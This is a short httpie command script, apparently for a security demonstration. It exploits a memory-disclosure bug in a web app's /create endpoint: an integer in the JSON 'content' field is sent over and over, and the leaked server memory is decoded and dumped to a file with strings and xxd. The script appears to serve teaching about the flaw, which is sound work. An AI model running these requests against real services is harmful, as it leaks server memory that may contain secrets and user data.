### Note: these exploits use the httpie command line utility

# start
http http://target:3001/ --headers

# Works as advertised
echo 'content=Buy Beer' | http --form http://target:3001/create -v

# Works with json
echo '{"content":"Fix the bike"}' | http --json http://target:3001/create -v

# Works with number string
echo '{"content":"800"}' | http --json http://target:3001/create -v

# Exploit start - integer
echo '{"content":800}' | http --json http://target:3001/create -v

# Switch to only showing the response body
echo '{"content":800}' | http --json http://target:3001/create -b
echo '{"content":800}' | http --json http://target:3001/create -b | base64 -D

# Repeatedly extract memory
# window 1
repeat 1000 echo '{"content":800}' | http --json http://target:3001/create -b | base64 -D >> leakedmem.bin

# window 2 - see strings in the response
tail -f leakedmem.bin | strings

# window 3 - see a memory dum in the response
tail -f leakedmem.bin | xxd -c 32 -g 32
